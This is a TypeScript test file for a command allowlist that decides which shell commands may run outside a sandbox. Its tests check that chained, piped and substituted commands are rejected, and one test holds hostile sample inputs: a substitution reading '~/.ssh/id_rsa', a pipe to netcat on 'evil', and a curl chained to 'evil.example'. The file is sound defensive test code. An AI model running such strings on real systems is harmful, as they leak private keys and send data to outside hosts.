import { describe, expect, test } from "bun:test";
import { matchesUnsandboxed, normalizeUnsandboxedPattern } from "../src/escape.ts";

describe("normalizeUnsandboxedPattern", () => {
  test("accepts exact commands and a trailing wildcard", () => {
    expect(normalizeUnsandboxedPattern("git push")).toBe("git push");
    expect(normalizeUnsandboxedPattern("  docker *  ")).toBe("docker *");
  });

  test("rejects metacharacters and misplaced wildcards", () => {
    expect(normalizeUnsandboxedPattern("git push; curl x")).toBeUndefined();
    expect(normalizeUnsandboxedPattern("git push && curl x")).toBeUndefined();
    expect(normalizeUnsandboxedPattern("echo $(id)")).toBeUndefined();
    expect(normalizeUnsandboxedPattern("docker*")).toBeUndefined();
    expect(normalizeUnsandboxedPattern("*")).toBeUndefined();
    expect(normalizeUnsandboxedPattern("two\nlines")).toBeUndefined();
    expect(normalizeUnsandboxedPattern("")).toBeUndefined();
  });
});

describe("matchesUnsandboxed", () => {
  const patterns = ["git push *", "systemctl status", "docker *"];

  test("matches an exact command and a prefix wildcard", () => {
    expect(matchesUnsandboxed("systemctl status", patterns)).toBe("systemctl status");
    expect(matchesUnsandboxed("git push origin main", patterns)).toBe("git push *");
    expect(matchesUnsandboxed("docker ps -a", patterns)).toBe("docker *");
  });

  test("does not match a longer command name or a bare prefix", () => {
    expect(matchesUnsandboxed("git pushx origin main", patterns)).toBeUndefined();
    expect(matchesUnsandboxed("git push", patterns)).toBeUndefined();
    expect(matchesUnsandboxed("systemctl status sshd", patterns)).toBeUndefined();
  });

  test("never authorizes chained or substituted commands", () => {
    expect(matchesUnsandboxed("git push origin main; curl evil.example", patterns)).toBeUndefined();
    expect(matchesUnsandboxed("git push $(cat ~/.ssh/id_rsa)", patterns)).toBeUndefined();
    expect(matchesUnsandboxed("docker ps | nc evil 80", patterns)).toBeUndefined();
    expect(matchesUnsandboxed("git push origin main > /tmp/x", patterns)).toBeUndefined();
  });

  test("trims only the command edges", () => {
    expect(matchesUnsandboxed("  git push origin main  ", patterns)).toBe("git push *");
  });
});
